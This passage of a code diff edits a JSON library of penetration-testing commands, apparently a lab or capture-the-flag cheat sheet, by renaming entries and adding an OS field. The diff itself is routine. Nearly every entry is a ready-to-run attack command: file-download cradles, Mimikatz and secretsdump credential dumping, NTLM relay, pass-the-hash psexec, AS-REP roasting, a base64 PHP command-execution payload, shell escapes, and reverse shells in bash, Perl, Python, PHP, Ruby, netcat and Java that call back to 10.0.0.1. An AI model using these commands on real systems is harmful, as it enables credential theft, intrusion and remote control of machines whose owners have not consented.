-      "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file"
+      "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file",
+      "OS": "Windows"
     },
     {
-      "Name": "Certutil",
+      "Name": "Download File Certutil",
       "Category": 17,
       "Description": "Download file to windows",
-      "Command": "certutil -UrlCache -f http://host.com/file .\\file"
+      "Command": "certutil -UrlCache -f http://host.com/file .\\file",
+      "OS": "Windows"
     },
     {
-      "Name": "NetStat",
+      "Name": "List Network Connections",
       "Category": 17,
       "Description": "List all active network connections and listening ports",
-      "Command": "netstat -ano"
+      "Command": "netstat -ano",
+      "OS": "Windows"
     },
     {
-      "Name": "Route",
+      "Name": "Display Routing Table",
       "Category": 17,
       "Description": "Display the routing table, which contains all routes of the system",
-      "Command": "route print"
+      "Command": "route print",
+      "OS": "Windows"
     },
     {
-      "Name": "SystemInfo",
+      "Name": "Display System Information",
       "Category": 17,
       "Description": "Display windows system information",
-      "Command": "systeminfo"
+      "Command": "systeminfo",
+      "OS": "Windows"
     },
     {
-      "Name": "Impacket-secretsdump ",
+      "Name": "Dump Hashes Secretsdump",
       "Category": 9,
       "Description": "Dump hashes from sam and system files",
-      "Command": "impacket-secretsdump -sam sam -system system local"
+      "Command": "impacket-secretsdump -sam sam -system system local",
+      "OS": "Linux"
     },
     {
-      "Name": "Impacket-ntlmrelayx",
+      "Name": "Execute NTLM Relay",
       "Category": 9,
       "Description": "Execute ntlm smb relay attack",
-      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'"
+      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'",
+      "OS": "Linux"
     },
     {
-      "Name": "Impacket-psexec",
+      "Name": "Execute PsExec Hash",
       "Category": 9,
       "Description": "Execute psexec on remote machine using NTLM hash",
-      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212"
+      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212",
+      "OS": "Linux"
     },
     {
-      "Name": "Mimikatz",
+      "Name": "Elevate System Token",
       "Category": 16,
       "Description": "Elevate to SYSTEM user privileges",
-      "Command": "token::elevate"
+      "Command": "token::elevate",
+      "OS": "Windows"
     },
     {
-      "Name": "Mimikatz",
+      "Name": "Enable Debug Privilege",
       "Category": 16,
       "Description": "Enable SeDebugPrivilege access right",
-      "Command": "privilege::debug"
+      "Command": "privilege::debug",
+      "OS": "Windows"
     },
     {
-      "Name": "Mimikatz",
+      "Name": "Dump SAM Hashes",
       "Category": 16,
       "Description": "Extract the NTLM hashes from the SAM",
-      "Command": "lsadump::sam"
+      "Command": "lsadump::sam",
+      "OS": "Windows"
     },
     {
-      "Name": "Mimikatz",
+      "Name": "Extract Logon Passwords",
       "Category": 16,
       "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
-      "Command": "sekurlsa::logonpasswords"
+      "Command": "sekurlsa::logonpasswords",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Local Users",
       "Category": 15,
       "Description": "Get Local Users on Windows",
-      "Command": "Get-LocalUser"
+      "Command": "Get-LocalUser",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Get Computer Information",
       "Category": 15,
       "Description": "Get Computer Info on Windows",
-      "Command": "Get-ComputerInfo"
+      "Command": "Get-ComputerInfo",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Local Groups",
       "Category": 15,
       "Description": "Get Group Info on Windows",
-      "Command": "Get-LocalGroup"
+      "Command": "Get-LocalGroup",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Group Members",
       "Category": 15,
       "Description": "Get Group Member Info on Windows",
-      "Command": "Get-LocalGroupMember 'Group Name'"
+      "Command": "Get-LocalGroupMember 'Group Name'",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List 32bit Applications",
       "Category": 15,
       "Description": "List all installed 32bit applications",
-      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List 64bit Applications",
       "Category": 15,
       "Description": "List all installed 64bit applications",
-      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Process Paths",
       "Category": 15,
       "Description": "List all running processes executable paths",
-      "Command": "(Get-Process).Path"
+      "Command": "(Get-Process).Path",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Running Processes",
       "Category": 15,
       "Description": "List all running processes",
-      "Command": "Get-Process"
+      "Command": "Get-Process",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Show PowerShell History",
       "Category": 15,
       "Description": "Show powershell history for current user",
-      "Command": "Get-History"
+      "Command": "Get-History",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Get History Path",
       "Category": 15,
       "Description": "Show powershell history file path",
-      "Command": "(Get-PSReadlineOption).HistorySavePath"
+      "Command": "(Get-PSReadlineOption).HistorySavePath",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Search KDBX Files",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for extension kdbx",
-      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
+      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Search Event Logs",
       "Category": 15,
       "Description": "Search windows events by event ID",
-      "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message"
+      "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Grep PowerShell Output",
       "Category": 15,
       "Description": "Grep powershell command output",
-      "Command": "Select-String -Pattern 'search term'"
+      "Command": "Select-String -Pattern 'search term'",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Search Common Files",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for common extensions",
-      "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
+      "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List All Services",
       "Category": 15,
       "Description": "Search for all services, running and stopped, that don't have system32 in the path",
-      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}"
+      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "List Running Services",
       "Category": 15,
       "Description": "Search for running services that don't have system32 in the path",
-      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}"
+      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Test Port Connectivity",
       "Category": 7,
       "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
-      "Command": "Test-NetConnection -Port 25 192.168.50.8"
+      "Command": "Test-NetConnection -Port 25 192.168.50.8",
+      "OS": "Windows"
     },
     {
-      "Name": "SystemCTL",
+      "Name": "Start System Service",
       "Category": 9,
       "Description": "Starts a specified service using systemctl",
-      "Command": "sudo systemctl start servicename"
+      "Command": "sudo systemctl start servicename",
+      "OS": "Linux"
     },
     {
-      "Name": "Nmap",
+      "Name": "Run Vuln Scan",
       "Category": 5,
       "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
-      "Command": "nmap --script vuln -p 80,443 192.168.192.13"
+      "Command": "nmap --script vuln -p 80,443 192.168.192.13",
+      "OS": "Linux"
     },
     {
-      "Name": "PHP Filter Base64 Payload",
+      "Name": "Encode Resource Base64",
       "Category": 2,
       "Description": "Uses PHP filter to encode a resource in base64, potentially for data exfiltration",
-      "Command": "php://filter/convert.base64-encode/resource="
+      "Command": "php://filter/convert.base64-encode/resource=",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Data URI Command Execution",
+      "Name": "Execute Encoded Command",
       "Category": 2,
       "Description": "Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'",
-      "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
+      "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Python HTTP Server",
+      "Name": "Start Python Server",
       "Category": 14,
       "Description": "Creates a simple python http server on port 80",
-      "Command": "python3 -m http.server 80 "
+      "Command": "python3 -m http.server 80 ",
+      "OS": "Linux"
     },
     {
-      "Name": "Nmap UDP SNMP Scan",
+      "Name": "Scan UDP SNMP Ports",
       "Category": 7,
       "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
-      "Command": "sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt"
+      "Command": "sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt",
+      "OS": "Linux"
     },
     {
-      "Name": "Onesixtyone SNMP Brute Force",
+      "Name": "Brute SNMP Communities",
       "Category": 7,
       "Description": "Performs SNMP community string brute-forcing using a community list against specified IPs",
-      "Command": "onesixtyone -c community -i ips"
+      "Command": "onesixtyone -c community -i ips",
+      "OS": "Linux"
     },
     {
-      "Name": "SNMPwalk Public Community",
+      "Name": "Walk Public SNMP",
       "Category": 7,
       "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
-      "Command": "snmpwalk -c public -v1 -t 10 192.168.50.151"
+      "Command": "snmpwalk -c public -v1 -t 10 192.168.50.151",
+      "OS": "Linux"
     },
     {
-      "Name": "SNMPwalk LAN Manager Users",
+      "Name": "Enum LAN Users SNMP",
       "Category": 7,
       "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25"
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25",
+      "OS": "Linux"
     },
     {
-      "Name": "SNMPwalk Running Processes",
+      "Name": "List Processes SNMP",
       "Category": 7,
       "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2"
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2",
+      "OS": "Linux"
     },
     {
-      "Name": "SNMPwalk Installed Software",
+      "Name": "List Software SNMP",
       "Category": 7,
       "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2"
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2",
+      "OS": "Linux"
     },
     {
-      "Name": "SNMPwalk TCP Connections",
+      "Name": "List TCP SNMP",
       "Category": 7,
       "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3"
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3",
+      "OS": "Linux"
     },
     {
-      "Name": "Telnet SMTP Connect",
+      "Name": "Connect Telnet SMTP",
       "Category": 7,
       "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
-      "Command": "telnet 192.168.50.8 25"
+      "Command": "telnet 192.168.50.8 25",
+      "OS": "Win/Lin"
     },
     {
       "Name": "Enable Telnet Client",
       "Category": 8,
       "Description": "Enables the Telnet Client feature on a Windows system using DISM",
-      "Command": "dism /online /Enable-Feature /FeatureName:TelnetClient"
+      "Command": "dism /online /Enable-Feature /FeatureName:TelnetClient",
+      "OS": "Windows"
     },
     {
-      "Name": "Netcat SMTP Connect",
+      "Name": "Connect Netcat SMTP",
       "Category": 7,
       "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
-      "Command": "nc -nv 192.168.50.8 25"
+      "Command": "nc -nv 192.168.50.8 25",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Enum4linux Multi-IP Scan",
+      "Name": "Scan Multiple Enum4linux",
       "Category": 7,
       "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
-      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.168.192.$i ; done"
+      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.168.192.$i ; done",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Verbose Scan",
+      "Name": "Verbose Enum4linux Scan",
       "Category": 7,
       "Description": "Runs enum4linux in verbose mode to show underlying commands",
-      "Command": "enum4linux -v target-ip"
+      "Command": "enum4linux -v target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux All Options",
+      "Name": "Full Enum4linux Scan",
       "Category": 7,
       "Description": "Runs all enum4linux options except dictionary-based share name guessing",
-      "Command": "enum4linux -a target-ip"
+      "Command": "enum4linux -a target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux User List",
+      "Name": "List Users Enum4linux",
       "Category": 7,
       "Description": "Lists usernames if the server allows (RestrictAnonymous = 0)",
-      "Command": "enum4linux -U target-ip"
+      "Command": "enum4linux -U target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux User List with Credentials",
+      "Name": "List Users Creds",
       "Category": 7,
       "Description": "Lists all users using provided credentials, bypassing RestrictAnonymous",
-      "Command": "enum4linux -u administrator -p password -U target-ip"
+      "Command": "enum4linux -u administrator -p password -U target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Default RID Scan",
+      "Name": "Default RID Enum",
       "Category": 7,
       "Description": "Pulls usernames from default RID range (500-550,1000-1050)",
-      "Command": "enum4linux -r target-ip"
+      "Command": "enum4linux -r target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Custom RID Scan",
+      "Name": "Custom RID Enum",
       "Category": 7,
       "Description": "Pulls usernames using a custom RID range (600-660)",
-      "Command": "enum4linux -R 600-660 target-ip"
+      "Command": "enum4linux -R 600-660 target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Group List",
+      "Name": "List Groups Enum4linux",
       "Category": 7,
       "Description": "Lists groups, with optional username and password support",
-      "Command": "enum4linux -G target-ip"
+      "Command": "enum4linux -G target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Share List",
+      "Name": "List Shares Enum4linux",
       "Category": 7,
       "Description": "Lists Windows shares, with optional username and password support",
-      "Command": "enum4linux -S target-ip"
+      "Command": "enum4linux -S target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Share Dictionary Attack",
+      "Name": "Dict Attack Shares",
       "Category": 7,
       "Description": "Performs dictionary attack on shares if share list retrieval is blocked",
-      "Command": "enum4linux -s shares.txt target-ip"
+      "Command": "enum4linux -s shares.txt target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux OS Info",
+      "Name": "Get OS Info Enum",
       "Category": 7,
       "Description": "Pulls OS information using smbclient, including service pack version",
-      "Command": "enum4linux -o target-ip"
+      "Command": "enum4linux -o target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Enum4linux Printer Info",
+      "Name": "List Printers Enum",
       "Category": 7,
       "Description": "Pulls information about printers known to the target device",
-      "Command": "enum4linux -i target-ip"
+      "Command": "enum4linux -i target-ip",
+      "OS": "Linux"
     },
     {
-      "Name": "Net View Shares",
+      "Name": "View Domain Shares",
       "Category": 7,
       "Description": "Lists all shared resources on the target domain controller dc01",
-      "Command": "net view \\dc01 /all"
+      "Command": "net view \\dc01 /all",
+      "OS": "Windows"
     },
     {
-      "Name": "Nmap SMB OS Discovery",
+      "Name": "Discover SMB OS",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
-      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152"
+      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152",
+      "OS": "Linux"
     },
     {
-      "Name": "NBTScan",
+      "Name": "Scan NetBIOS Names",
       "Category": 7,
       "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
-      "Command": "sudo nbtscan -r 192.168.50.0/24"
+      "Command": "sudo nbtscan -r 192.168.50.0/24",
+      "OS": "Linux"
     },
     {
-      "Name": "Nmap SMB Scan",
+      "Name": "Scan SMB Ports",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
-      "Command": "nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254"
+      "Command": "nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254",
+      "OS": "Linux"
     },
     {
-      "Name": "Nmap SYN Scan",
+      "Name": "SYN Port Scan",
       "Category": 7,
       "Description": "Port scanning with nmap",
-      "Command": "nmap -sS 192.168.192.1"
+      "Command": "nmap -sS 192.168.192.1",
+      "OS": "Linux"
     },
     {
-      "Name": "Netcat Port Scan",
+      "Name": "Scan Ports Netcat",
       "Category": 7,
       "Description": "Port scanning with netcat",
-      "Command": "nc -nvv -w1 -z 192.168.192.151 1-1000"
+      "Command": "nc -nvv -w1 -z 192.168.192.151 1-1000",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Netcat UDP Port Scan",
+      "Name": "UDP Scan Netcat",
       "Category": 7,
       "Description": "UDP Port scanning with netcat",
-      "Command": "nc -nvv -u -w1 -z 192.168.192.151 150-200"
+      "Command": "nc -nvv -u -w1 -z 192.168.192.151 150-200",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "dnsenum",
+      "Name": "Enum DNS Records",
       "Category": 0,
       "Description": "Attempts to retrieve the dns records for the given domain",
-      "Command": "dnsenum domain.com"
+      "Command": "dnsenum domain.com",
+      "OS": "Linux"
     },
     {
-      "Name": "Evil-WinRM",
+      "Name": "Connect WinRM Shell",
       "Category": 8,
       "Description": "Attempts to connect to the windows remote management service",
-      "Command": "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice"
+      "Command": "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice",
+      "OS": "Linux"
     },
     {
-      "Name": "Hashcrack",
+      "Name": "Crack Hashes Hashcat",
       "Category": 13,
       "Description": "Runs the hashcat command against hashes.txt using the rockyou.txt file and applies the best64.rule transformations to it",
-      "Command": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+      "Command": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+      "OS": "Linux"
     },
     {
-      "Name": "GetNPUsers - AS-REPRoast impacket-GetNPUsers",
+      "Name": "Roast AS-REP Hashes",
       "Category": 12,
       "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
-      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.10.10.161 -usersfile ./users -request -format hashcat -outputfile hashes.txt"
+      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.10.10.161 -usersfile ./users -request -format hashcat -outputfile hashes.txt",
+      "OS": "Linux"
     },
     {
-      "Name": "LDAP Search get domain name with anonymous login",
+      "Name": "Get Domain LDAP Anon",
       "Category": 12,
       "Description": "Get's the default naming context and displays the domain name",
-      "Command": "ldapsearch -x -H ldap://10.10.10.161 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext"
+      "Command": "ldapsearch -x -H ldap://10.10.10.161 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext",
+      "OS": "Linux"
     },
     {
-      "Name": "Python BASH TTY Shell",
+      "Name": "Spawn Python TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Python",
-      "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "OS": "Linux"
     },
     {
-      "Name": "Python 3 BASH TTY Shell",
+      "Name": "Spawn Python3 TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Python 3",
-      "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "OS": "Linux"
     },
     {
-      "Name": "Echo BASH TTY Shell",
+      "Name": "Spawn Echo TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using echo and os.system",
-      "Command": "echo os.system('/bin/bash')"
+      "Command": "echo os.system('/bin/bash')",
+      "OS": "Linux"
     },
     {
-      "Name": "BASH TTY Shell",
+      "Name": "Spawn Bash TTY",
       "Category": 11,
       "Description": "Directly spawns an interactive BASH TTY shell",
-      "Command": "/bin/bash -i"
+      "Command": "/bin/bash -i",
+      "OS": "Linux"
     },
     {
-      "Name": "Perl BASH TTY Shell",
+      "Name": "Spawn Perl TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Perl",
-      "Command": "perl -e 'exec \"/bin/bash\";'"
+      "Command": "perl -e 'exec \"/bin/bash\";'",
+      "OS": "Linux"
     },
     {
-      "Name": "Ruby BASH TTY Shell",
+      "Name": "Spawn Ruby TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Ruby",
-      "Command": "ruby -e 'exec \"/bin/bash\"'"
+      "Command": "ruby -e 'exec \"/bin/bash\"'",
+      "OS": "Linux"
     },
     {
-      "Name": "Lua BASH TTY Shell",
+      "Name": "Spawn Lua TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using Lua",
-      "Command": "lua -e 'os.execute(\"/bin/bash\")'"
+      "Command": "lua -e 'os.execute(\"/bin/bash\")'",
+      "OS": "Linux"
     },
     {
-      "Name": "IRB BASH TTY Shell",
+      "Name": "Spawn IRB TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell using IRB",
-      "Command": "exec \"/bin/bash\""
+      "Command": "exec \"/bin/bash\"",
+      "OS": "Linux"
     },
     {
-      "Name": "Vi/Vim BASH TTY Shell (Command 1)",
+      "Name": "Vim Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim",
-      "Command": ":!bash"
+      "Command": ":!bash",
+      "OS": "Linux"
     },
     {
-      "Name": "Vi/Vim BASH TTY Shell (Command 2)",
+      "Name": "Vim Set Shell TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell",
-      "Command": ":set shell=/bin/bash:shell"
+      "Command": ":set shell=/bin/bash:shell",
+      "OS": "Linux"
     },
     {
-      "Name": "Nano BASH TTY Shell",
+      "Name": "Nano Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Nano editor",
-      "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0"
+      "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0",
+      "OS": "Linux"
     },
     {
-      "Name": "Nmap BASH TTY Shell",
+      "Name": "Nmap Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Nmap",
-      "Command": "!bash"
+      "Command": "!bash",
+      "OS": "Linux"
     },
     {
       "Name": "Bash Reverse Shell",
       "Category": 10,
       "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
-      "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+      "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+      "OS": "Linux"
     },
     {
       "Name": "Perl Reverse Shell",
       "Category": 10,
       "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+      "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "OS": "Win/Lin"
     },
     {
       "Name": "Python Reverse Shell",
       "Category": 10,
       "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "OS": "Win/Lin"
     },
     {
       "Name": "PHP Reverse Shell",
       "Category": 10,
       "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+      "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "OS": "Win/Lin"
     },
     {
       "Name": "Ruby Reverse Shell",
       "Category": 10,
       "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "OS": "Win/Lin"
     },
     {
       "Name": "Netcat Reverse Shell",
       "Category": 10,
       "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
-      "Command": "nc -e /bin/sh 10.0.0.1 1234"
+      "Command": "nc -e /bin/sh 10.0.0.1 1234",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Netcat FIFO Reverse Shell",
+      "Name": "Netcat FIFO Shell",
       "Category": 10,
       "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
-      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
+      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f",
+      "OS": "Linux"
     },
     {
       "Name": "Java Reverse Shell",
       "Category": 10,
       "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
+      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
+      "OS": "Win/Lin"
     },
     {
       "Name": "Xterm Reverse Shell",
       "Category": 10,
       "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
-      "Command": "xterm -display 10.0.0.1:1"
+      "Command": "xterm -display 10.0.0.1:1",
